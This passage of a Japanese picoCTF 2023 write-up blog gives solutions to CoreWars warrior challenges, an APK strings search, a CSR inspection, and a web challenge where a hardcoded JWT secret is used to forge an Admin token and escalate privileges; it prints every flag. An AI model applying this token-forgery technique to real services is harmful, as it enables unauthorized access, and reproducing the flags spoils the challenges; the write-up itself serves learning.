+<p>とりあえず、<code>mov 0, 0</code>で 動かないようにしたら、常に負けるようになり、フラグが得られます。</p>
+<pre>
+;redcode
+;name Imp Ex
+;assert 1
+mov 0, 0
+end
+</pre>
+<p><br /></p>
+<p>実行結果：</p>
+<pre>
+$ nc saturn.picoctf.net 56861 < imp.red
+;redcode
+;name Imp Ex
+;assert 1
+mov 0, 0
+end
+Submit your warrior: (enter 'end' when done)
+
+Warrior1:
+;redcode
+;name Imp Ex
+;assert 1
+mov 0, 0
+end
+
+Rounds: 100
+Warrior 1 wins: 0
+Warrior 2 wins: 100
+Ties: 0
+You did it!
+picoCTF{h3r0_t0_z3r0_4m1r1gh7_e476d4cf}
+
+</pre>
+<p><br /></p>
+<p>Flag: <code>picoCTF{h3r0_t0_z3r0_4m1r1gh7_e476d4cf}</code></p>
+<p><br /><br />
+<br /><br /></p>
+<h2 id="reverse-engineering-ready-gladiator-1-200-points">[Reverse Engineering]: Ready Gladiator 1 (200 points)</h2>
+<hr>
+<h3 id="challenge-9">Challenge</h3>
+<blockquote>
+<p>Can you make a CoreWars warrior that wins?
+Your opponent is the Imp. The source is available here. If you wanted to pit the Imp against himself, you could download the Imp and connect to the CoreWars server like this:
+nc saturn.picoctf.net 59752 &lt; imp.red
+To get the flag, you must beat the Imp at least once out of the many rounds.
+<br /><br />
+Hint: You may be able to find a viable warrior in beginner docs</p>
+</blockquote>
+<p><br /></p>
+<h3 id="solution-9">Solution</h3>
+<p>参考にしたサイト：<a href="https://vyznev.net/corewar/guide.html">https://vyznev.net/corewar/guide.html</a></p>
+<p>とりあえず、The Dwarf でやってみました。</p>
+<pre>
+$ nc saturn.picoctf.net 59752 < test.red
+;redcode
+;name Imp Ex
+;assert 1
+        ADD #4, 3        ; execution begins here
+        MOV 2, @2
+        JMP -2
+        DAT #0, #0
+end
+Submit your warrior: (enter 'end' when done)
+
+Warrior1:
+;redcode
+;name Imp Ex
+;assert 1
+        ADD #4, 3        ; execution begins here
+        MOV 2, @2
+        JMP -2
+        DAT #0, #0
+end
+
+Rounds: 100
+Warrior 1 wins: 23
+Warrior 2 wins: 0
+Ties: 77
+You did it!
+picoCTF{1mp_1n_7h3_cr055h41r5_ec57a42e}
+
+</pre>
+<p><br /></p>
+<p>Flag: <code>picoCTF{1mp_1n_7h3_cr055h41r5_ec57a42e}</code></p>
+<p><br /><br />
+<br /><br /></p>
+<h2 id="reverse-engineering-ready-gladiator-2-400-points">[Reverse Engineering]: Ready Gladiator 2 (400 points)</h2>
+<hr>
+<h3 id="challenge-10">Challenge</h3>
+<blockquote>
+<p>Can you make a CoreWars warrior that wins every single round?
+Your opponent is the Imp. The source is available here. If you wanted to pit the Imp against himself, you could download the Imp and connect to the CoreWars server like this:
+nc saturn.picoctf.net 49743 &lt; imp.red
+To get the flag, you must beat the Imp all 100 rounds.
+<br /><br />
+Hint: If your warrior is close, try again, it may work on subsequent tries&hellip; why is that?</p>
+</blockquote>
+<p><br /></p>
+<h3 id="solution-10">Solution</h3>
+<p><code>corewars against imp</code> をキーワードにググったところ、Redditで、このチャレンジの答えをもらっている人がいたんですよね。</p>
+<p>こんな風に問題を解かれてしまうと、運営側も悩ましいですね。。。</p>
+<pre>
+$ nc saturn.picoctf.net 49743 < test2.red
+;redcode-94
+;name Dwarf
+;author A.K. Dewdney
+;strategy Bombs the core at regular intervals.
+;(slightly modified by Ilmari Karonen)
+;assert CORESIZE % 4 == 0
+JMP 0, <-5
+end
+Submit your warrior: (enter 'end' when done)
+
+Warrior1:
+;redcode-94
+;name Dwarf
+;author A.K. Dewdney
+;strategy Bombs the core at regular intervals.
+;(slightly modified by Ilmari Karonen)
+;assert CORESIZE % 4 == 0
+JMP 0, <-5
+end
+
+Rounds: 100
+Warrior 1 wins: 100
+Warrior 2 wins: 0
+Ties: 0
+You did it!
+picoCTF{d3m0n_3xpung3r_fc41524e}
+
+</pre>
+<p><br /></p>
+<p>Flag: <code>picoCTF{d3m0n_3xpung3r_fc41524e}</code></p>
+<p><br /><br />
+<br /><br /></p>
+<h2 id="reverse-engineering-timer-100-points">[Reverse Engineering]: timer (100 points)</h2>
+<hr>
+<h3 id="challenge-11">Challenge</h3>
+<blockquote>
+<p>You will find the flag after analysing this apk
+<br /><br />
+Hint1: Decompile
+<br />
+Hint2: mobsf or jadx</p>
+</blockquote>
+<ul>
+<li>timer.apk</li>
+</ul>
+<p><br /></p>
+<h3 id="solution-11">Solution</h3>
+<p>他の2つのRevチャレンジ <code>Reverse</code> (100 points)、<code>Safe Opener 2</code> (100 points) は strings コマンドで解けるわけですが、これもほぼ同様でデコンパイルしなくても解けちゃいます。</p>
+<p>apkファイルはzipファイルなので、まずはzip解凍します。</p>
+<p>そうすると、classes3.dex というファイルがあるので、strings コマンドを実行します。</p>
+<pre>
+$ strings classes3.dex | grep pico
+*picoCTF{t1m3r_r3v3rs3d_succ355fully_17496}
+</pre>
+<p><br /></p>
+<p>Flag: <code>picoCTF{t1m3r_r3v3rs3d_succ355fully_17496}</code></p>
+<p><br /><br />
+<br /><br /></p>
+<h2 id="cryptography-readmycert-100-points">[Cryptography]: ReadMyCert (100 points)</h2>
+<hr>
+<h3 id="challenge-12">Challenge</h3>
+<blockquote>
+<p>How about we take you on an adventure on exploring certificate signing requests
+Take a look at this CSR file here.
+<br /><br />
+Hint: Download the certificate signing request and try to read it.</p>
+</blockquote>
+<ul>
+<li>readmycert.csr</li>
+</ul>
+<p><br /></p>
+<h3 id="solution-12">Solution</h3>
+<p>CNにフラグがセットされていました。</p>
+<pre>
+$ openssl req -text -in readmycert.csr
+Certificate Request:
+    Data:
+        Version: 0 (0x0)
+        Subject: CN=picoCTF{read_mycert_373b4ab0}/name=ctfPlayer
+        Subject Public Key Info:
+            Public Key Algorithm: rsaEncryption
+                RSA Public-Key: (2048 bit)
+                Modulus:
+:
+(snip)
+:
+</pre>
+<p><br /></p>
+<p>Flag: <code>picoCTF{read_mycert_373b4ab0}</code></p>
+<p><br /><br />
+<br /><br /></p>
+<h2 id="web-java-code-analysis-300-points">[Web]: Java Code Analysis!?! (300 points)</h2>
+<hr>
+<h3 id="challenge-13">Challenge</h3>
+<blockquote>
+<p>BookShelf Pico, my premium online book-reading service.
+I believe that my website is super secure. I challenge you to prove me wrong by reading the &lsquo;Flag&rsquo; book!
+Here are the credentials to get you started:
+Username: &ldquo;user&rdquo;
+Password: &ldquo;user&rdquo;
+Source code can be downloaded here.
+Website can be accessed here!.
+<br /><br />
+Hint1: Maybe try to find the JWT Signing Key (&ldquo;secret key&rdquo;) in the source code? Maybe it&rsquo;s hardcoded somewhere? Or maybe try to crack it?
+<br />
+Hint2: The &lsquo;role&rsquo; and &lsquo;userId&rsquo; fields in the JWT can be of interest to you!
+<br />
+Hint3: The &lsquo;controllers&rsquo;, &lsquo;services&rsquo; and &lsquo;security&rsquo; java packages in the given source code might need your attention. We&rsquo;ve provided a README.md file that contains some documentation.
+<br />
+Hint4: Upgrade your &lsquo;role&rsquo; with the new (cracked) JWT. And re-login for the new role to get reflected in browser&rsquo;s localStorage.</p>
+</blockquote>
+<p><br /></p>
+<h3 id="solution-13">Solution</h3>
+<p>以下のファイルの中で、JWTのsecretを設定しているところが見つかります。</p>
+<ul>
+<li>bookshelf-pico/src/main/java/io/github/nandandesai/pico/security/SecretGenerator.java</li>
+</ul>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-java" data-lang="java"><span class="o">:</span>
+<span class="o">(</span><span class="n">snip</span><span class="o">)</span>
+<span class="o">:</span>
+<span class="kd">class</span> <span class="nc">SecretGenerator</span> <span class="o">{</span>
+    <span class="kd">private</span> <span class="n">Logger</span> <span class="n">logger</span> <span class="o">=</span> <span class="n">LoggerFactory</span><span class="o">.</span><span class="na">getLogger</span><span class="o">(</span><span class="n">SecretGenerator</span><span class="o">.</span><span class="na">class</span><span class="o">);</span>
+    <span class="kd">private</span> <span class="kd">static</span> <span class="kd">final</span> <span class="n">String</span> <span class="n">SERVER_SECRET_FILENAME</span> <span class="o">=</span> <span class="s">&#34;server_secret.txt&#34;</span><span class="o">;</span>
+
+    <span class="nd">@Autowired</span>
+    <span class="kd">private</span> <span class="n">UserDataPaths</span> <span class="n">userDataPaths</span><span class="o">;</span>
+
+    <span class="kd">private</span> <span class="n">String</span> <span class="nf">generateRandomString</span><span class="o">(</span><span class="kt">int</span> <span class="n">len</span><span class="o">)</span> <span class="o">{</span>
+        <span class="c1">// not so random
+</span><span class="c1"></span>        <span class="k">return</span> <span class="s">&#34;1234&#34;</span><span class="o">;</span>
+    <span class="o">}</span>
+<span class="o">:</span>
+<span class="o">(</span><span class="n">snip</span><span class="o">)</span>
+<span class="o">:</span>
+</code></pre></td></tr></table>
+</div>
+</div><p><br /></p>
+<p>server_secret.txt はzipファイルの中には存在していないですし、Hint1も加味すると、<code>1234</code>がsecretっぽいのがわかります。</p>
+<p>JWTを使ったCTFチャレンジで、secretがわかるのであれば、もう解けたも同然です。</p>
+<p><br /></p>
+<p>Burpでやりとりを見ていたたら、以下のpayloadが見つかりました。</p>
+<pre>
+{"type":"SUCCESS","payload":"eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJyb2xlIjoiRnJlZSIsImlzcyI6ImJvb2tzaGVsZiIsImV4cCI6MTY4MDM0MDk0MCwiaWF0IjoxNjc5NzM2MTQwLCJ1c2VySWQiOjEsImVtYWlsIjoidXNlciJ9.Gf0Ow6yh3CXQdlng2uk9FGIXQsEHrJ8O-djA7g-yd8I"}
+</pre>
+<p><br /></p>
+<p>これを、<a href="https://jwt.io/">https://jwt.io/</a> を使って、編集します。</p>
+<p>変更前：</p>
+<pre>
+{
+  "typ": "JWT",
+  "alg": "HS256"
+}
+
+{
+  "role": "Free",
+  "iss": "bookshelf",
+  "exp": 1680340940,
+  "iat": 1679736140,
+  "userId": 1,
+  "email": "user"
+}
+</pre>
+<p><br /></p>
+<p>変更後： (roleとuserIDを変えました)</p>
+<pre>
+{
+  "typ": "JWT",
+  "alg": "HS256"
+}
+
+{
+  "role": "Admin",
+  "iss": "bookshelf",
+  "exp": 1680340940,
+  "iat": 1679736140,
+  "userId": 0,
+  "email": "user"
+}
+</pre>
+<p><br /></p>
+<p>変更後のpayloadは、FireFoxのdeveloper toolで設定しました。
+Local Storageの中に出てくる auth-token と token-payload です。</p>
+<img src="https://captureamerica.github.io/writeups/img/pico2023_javacode1.png" alt="pico2023_javacode1.png">
+<p><br /></p>
+<p>これで Admin にはなれるのですが、フラグは表示されませんでした。</p>
+<img src="https://captureamerica.github.io/writeups/img/pico2023_javacode2.png" alt="pico2023_javacode2.png">
+<p><br /></p>
+<p>なので、Admin dashboardから、userのroleをAdminにして、userでログインしなおしてフラグをゲットしました。</p>
+<img src="https://captureamerica.github.io/writeups/img/pico2023_javacode3.png" alt="pico2023_javacode3.png">
+<p><br /></p>
+<p>Flag: <code>picoCTF{w34k_jwt_n0t_g00d_7745dc02}</code></p>
+<p><br /><br />
+<br /><br /></p>
+<hr>
+<p><br /><br />
+<br /><br /></p>
+
+    </div>
+
+    <div class="post-copyright">
+  <p class="copyright-item">
+    <span class="item-title">Author</span>
+    <span class="item-content">CaptureAmerica @ CTF フラxxグゲット</span>
+  </p>
+  <p class="copyright-item">
+    <span class="item-title">LastMod</span>
+    <span class="item-content">
+        2023-04-03
+        
+    </span>
+  </p>
+  
+  
+</div>
+<footer class="post-footer">
+      <div class="post-tags">
+          <a href="https://captureamerica.github.io/writeups/tags/ctf/">CTF</a>
+          </div>
+      <nav class="post-nav">
+        
+        <a class="next" href="https://captureamerica.github.io/writeups/post/gdgalgiers_ctf_2022/">
+            <span class="next-text nav-default">GDG Algiers CTF 2022 Writeup</span>
+            <span class="next-text nav-mobile">Next</span>
+            <i class="iconfont icon-right"></i>
+          </a>
+      </nav>
+    </footer>
+  </article>
+        </div>
+        
+
+  
+
+  
+
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="social-links">
+      <a href="https://github.com/CaptureAmerica/" class="iconfont icon-github" title="github"></a>
+  <a href="https://captureamerica.github.io/writeups/index.xml" type="application/rss+xml" class="iconfont icon-rss" title="rss"></a>
+</div>
+
+<div class="copyright">
+  <span class="power-by">
+    Powered by <a class="hexo-link" href="https://gohugo.io">Hugo</a>
+  </span>
+  <span class="division">|</span>
+  <span class="theme-info">
+    Theme - 
+    <a class="theme-link" href="https://github.com/olOwOlo/hugo-theme-even">Even</a>
+  </span>
+
+  
+
+  <span class="copyright-year">
+    &copy; 
+    2019 - 
+    2023<span class="heart"><i class="iconfont icon-heart"></i></span><span>CaptureAmerica @ CTF フラxxグゲット</span>
+  </span>
+</div>
+
+    </footer>
+
+    <div class="back-to-top" id="back-to-top">
+      <i class="iconfont icon-up"></i>
+    </div>
+  </div>
+  
+  <script src="https://cdn.jsdelivr.net/npm/jquery@3.2.1/dist/jquery.min.js" integrity="sha256-hwg4gsxgFZhOsEEamdOYGBf13FyQuiTwlAQgxVSNgt4=" crossorigin="anonymous"></script>
+  <script src="https://cdn.jsdelivr.net/npm/slideout@1.0.1/dist/slideout.min.js" integrity="sha256-t+zJ/g8/KXIJMjSVQdnibt4dlaDxc9zXr/9oNPeWqdg=" crossorigin="anonymous"></script>
+  
+
+
+
+<script type="text/javascript" src="https://captureamerica.github.io/writeups/js/main.min.c12618f9a600c40bd024996677e951e64d3487006775aeb22e200c990006c5c7.js"></script>
+
+
+<script type="application/javascript">
+var doNotTrack = false;
+if (!doNotTrack) {
+	window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;
+	ga('create', 'UA-104910699-2', 'auto');
+	ga('set', 'anonymizeIp', true);
+	ga('send', 'pageview');
+}
+</script>
+<script async src='https://www.google-analytics.com/analytics.js'></script>
+
+
+
+
+
+
+
+</body>
+</html>
